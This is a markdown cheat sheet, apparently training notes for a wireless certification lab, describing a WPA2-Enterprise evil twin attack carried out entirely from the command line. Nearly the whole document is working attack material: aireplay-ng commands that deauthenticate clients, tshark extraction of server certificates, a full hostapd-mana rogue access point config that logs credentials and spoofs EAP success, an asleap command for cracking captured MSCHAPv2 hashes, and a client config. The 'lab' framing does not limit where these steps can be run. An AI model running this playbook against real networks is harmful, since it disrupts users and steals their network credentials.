
# 🛡️ WPA2-Enterprise / Evil Twin Attack Flow 

## 📍 Goal
Simulate a WPA2-Enterprise Evil Twin attack in a SSH-only lab, using only CLI tools. The objective is to:
- Capture the authentication handshake
- Analyze EAP communications
- Extract useful information (CA, server certs)
- Replay the attack using hostapd-mana
- Connect with wpa_supplicant for testing

---

## 1. 📡 Monitor Interface Setup plus Discover plus DEAUT. 

> 🎯 *To catch the handshake we DEAUTH the fucking client connected to the fucking AP*
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg
sudo airodump-ng wlan0mon --band abg -c 44 -w wifi-corp
sudo aireplay-ng -0 1 -a <MAC-AP> -c <MAC-CLIENT> wlan0mon
sudo airmon-ng stop wlan0mon
```
---

## 2. 🎯 Capturing and Analyze EAP handshake

> 📦 *We use `tshark` to capture packets and save them to a PCAP file

```bash
tshark -r wifi-corp-01.cap -Y "ssl.handshake.certificate and eapol" -T fields -e "tls.handshake.certificate" |sed "s/://g" | xxd -ps -r | tee $(mktemp $tmpbase.cert.XXXX.der) | openssl x509 -inform der -text
```
or if you have time and you want, go slow:

```bash
tshark -i wlan0 -w enterprise.pcap -Y "eap || eapol"
tshark -r enterprise.pcap -Y "eap" -T fields -e frame.number -e eap.code -e eap.type -e eap.identity
tshark -r enterprise.pcap -Y "tls.handshake.certificate" -V | less
```
---

## 5. 🧪 Change CA and server files with the info you gained
> 🧬 *Extract the server's certificate from the PCAP, convert it, and analyze its contents.*

Then use:
```bash
make destroycerts
make
```
---

## 6. 🏴‍☠️ Set up hostapd-mana (Evil Twin)

> 🎣 *We use hostapd-mana to spawn a rogue AP that mimics the original WPA2-Enterprise network, using the previously extracted certs or fake ones signed with same CA.*

Minimal config example `mana.conf`:
```
# SSID of the AP
ssid=wifi-corp

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=2
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1

```

Minimal config example `mana.eap_user`:
```bash
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

FINALLY:
```bash
sudo hostapd-mana mana.conf
```

From here you should get the password 

```bash
asleap -C d4:b9:92:06:0e:57:9a:0d -R 59:b8:e1:db:c7:a8:8e:bc:f7:21:28:52:92:f0:21:2b:88:0f:df:c4:fb:ef:fe:6f -W /usr/share/john/password.lst
```

---

## 7. 🤖 wpa_supplicant (Client Side)
Sample config `client.conf`:

```
network={  
  ssid="wifi-corp"  
  scan_ssid=1  
  key_mgmt=WPA-EAP  
  identity="CONTOSO\juan.tr"  
  password="PASSWORD"  
  eap=PEAP  
  phase1="peaplabel=0"  
  phase2="auth=MSCHAPV2"  
}
```

Run:
```bash
wpa_supplicant -i wlan0 -c wpa_supplicant.conf
dhclient -v wlan0
```

> 📶 *This simulates a client attempting to connect to our rogue AP. We monitor and capture credentials in `/tmp/hostapd.credout` or via stdout.*

---

## ✅ Wrap-up
You’ve:
- Captured and dissected a WPA2-Enterprise handshake
- Extracted certs from TLS handshake
- Replicated the network and tricked clients
- Logged EAP credentials via hostapd-mana

This flow is 100% CLI-compatible and tailored for OSWP-style environments without GUI.
